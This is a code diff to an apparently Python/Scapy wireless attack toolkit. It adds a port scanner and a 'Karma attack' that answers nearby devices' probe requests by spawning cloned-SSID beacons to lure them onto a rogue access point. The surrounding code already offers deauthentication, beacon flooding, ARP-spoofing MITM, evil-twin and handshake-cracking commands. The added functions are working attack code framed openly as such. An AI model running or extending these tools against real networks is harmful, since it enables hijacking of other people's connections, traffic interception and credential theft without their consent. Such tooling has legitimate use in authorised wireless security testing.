@@ -107,9 +107,11 @@ def show_help():
         ("sniff <iface>", "📡 Live Traffic Audit (OS/Apps)"),
         ("arp scan [range]", "🌐 Advanced Network Mapping"),
         ("arp spoof <target> <gw>", "☢ MITM: Intercept local traffic"),
+        ("portscan <ip>", "🔍 Scan open services/ports on a target"),
         ("", ""),
         ("deauth <mac> <ap>", "💥 Kick device from network"),
         ("beacon <name1> <name2>", "🌀 Generate fake WiFi networks"),
+        ("karma", "😈 Karma Attack: Respond to all probes"),
         ("eviltwin <ssid> <mac> [tgt]", "🎭 Automated Rogue AP attack"),
         ("crack <pcap> <words>", "🗝 Audit Handshake strength"),
         ("stop_wifi", "🛑 Stop all active attacks"),
@@ -228,6 +230,45 @@ def run_sniff(iface, duration=0):
     scapy_sniff(iface=iface, prn=handler, store=False, timeout=duration if duration >0 else None)
 
 # =============================================================================
+# SECTION: Port Scanner (Formerly port_scanner.py)
+# =============================================================================
+
+COMMON_PORTS = {
+    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
+    53: "DNS", 80: "HTTP", 110: "POP3", 139: "NetBIOS",
+    143: "IMAP", 443: "HTTPS", 445: "SMB", 3306: "MySQL",
+    3389: "RDP", 5432: "PostgreSQL", 8080: "HTTP-Proxy"
+}
+
+def run_port_scan(ip):
+    import socket
+    console.print(f"[bold cyan]🔍 Service Discovery on {ip}...[/]")
+    results = []
+    
+    def check_port(p):
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.settimeout(0.5)
+                if s.connect_ex((ip, p)) == 0:
+                    results.append((p, COMMON_PORTS.get(p, "Unknown")))
+        except: pass
+
+    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}")) as progress:
+        task = progress.add_task(f"Scanning {len(COMMON_PORTS)} ports...", total=len(COMMON_PORTS))
+        threads = []
+        for p in COMMON_PORTS:
+            t = threading.Thread(target=check_port, args=(p,))
+            t.start(); threads.append(t)
+            progress.update(task, advance=1)
+        for t in threads: t.join()
+
+    table = Table(title=f"📜 Open Ports on {ip}", border_style="green")
+    table.add_column("Port", style="cyan"); table.add_column("Service", style="yellow")
+    for p, s in sorted(results): table.add_row(str(p), s)
+    console.print(table if results else "[dim red]No common ports found open.[/]")
+
+
+# =============================================================================
 # SECTION: WiFi Tactics (Formerly wifi_ops.py, portal.py, dns_dhcp.py)
 # =============================================================================
 
@@ -235,6 +276,7 @@ class WiFiTactics:
     def __init__(self, iface):
         self.iface = iface
         self.stop_ev = threading.Event()
+        self.seen_probes = set()
 
     def deauth(self, target, ap):
         pkt = RadioTap()/Dot11(addr1=target, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
@@ -250,6 +292,28 @@ class WiFiTactics:
         console.print(f"[bold magenta]🌀 Beacon Flood: {len(ssids)} SSIDs active[/]")
         while not self.stop_ev.is_set():
             for p in pkts: sendp(p, iface=self.iface, verbose=False); time.sleep(0.01)
+
+    def karma_attack(self):
+        """😈 Automatically respond to any SSID being searched for (Probe Requests)."""
+        console.print("[bold red]😈 Karma Attack Active:[/] Responding to all nearby Probe Requests...")
+        
+        def karma_cb(pkt):
+            if pkt.haslayer(Dot11Beacon) is False and pkt.haslayer(Dot11Elt) and pkt.type == 0 and pkt.subtype == 4:
+                # Type 0 Subtype 4 = Probe Request
+                ssid = pkt.info.decode(errors='ignore')
+                if ssid and ssid not in self.seen_probes:
+                    console.print(f"[bold yellow]✨ Luring device:[/] Found request for [cyan]{ssid}[/], cloning AP...")
+                    self.seen_probes.add(ssid)
+                    # Start a background beacon for this specific SSID to attract the device
+                    threading.Thread(target=self.evil_twin, args=(ssid, pkt.addr2), daemon=True).start()
+
+        scapy_sniff(iface=self.iface, prn=karma_cb, stop_filter=lambda _: self.stop_ev.is_set(), store=False)
+
+    def evil_twin(self, ssid, mac, target_mac=None):
+        # Implementation of targeted cloner
+        pkt = RadioTap()/Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=mac, addr3=mac)/Dot11Beacon()/Dot11Elt(ID='SSID', info=ssid)
+        while not self.stop_ev.is_set():
+            sendp(pkt, iface=self.iface, verbose=False, count=2); time.sleep(0.1)
 
 # =============================================================================
 # SECTION: Cracker (Formerly cracker.py) - REAL CRYPTO AUDIT
@@ -308,7 +372,11 @@ def audit_hash(pcap, wordlist):
 # =============================================================================
 
 state = {"monitor": None, "base": None, "wifi": None}
-COMMANDS = ["interfaces", "monitor", "scan", "wps", "sniff", "arp", "deauth", "beacon", "eviltwin", "crack", "help", "status", "clear", "exit"]
+COMMANDS = [
+    "interfaces", "monitor", "start", "stop",
+    "scan", "wps", "sniff", "arp", "deauth", "beacon", "karma", "eviltwin", "crack", "portscan", "stop_wifi", 
+    "help", "status", "clear", "exit", "quit",
+]
 completer = WordCompleter(COMMANDS, ignore_case=True)
 
 def main():
@@ -344,6 +412,11 @@ def main():
             elif cmd == "beacon":
                 if not state["wifi"]: state["wifi"] = WiFiTactics(state["monitor"])
                 threading.Thread(target=state["wifi"].beacon_flood, args=(args,), daemon=True).start()
+            elif cmd == "karma":
+                if not state["wifi"]: state["wifi"] = WiFiTactics(state["monitor"])
+                threading.Thread(target=state["wifi"].karma_attack, daemon=True).start()
+            elif cmd == "portscan":
+                run_port_scan(args[0])
             elif cmd == "stop_wifi":
                 if state["wifi"]: state["wifi"].stop_ev.set(); state["wifi"] = None
             elif cmd == "crack": audit_hash(args[0], args[1])
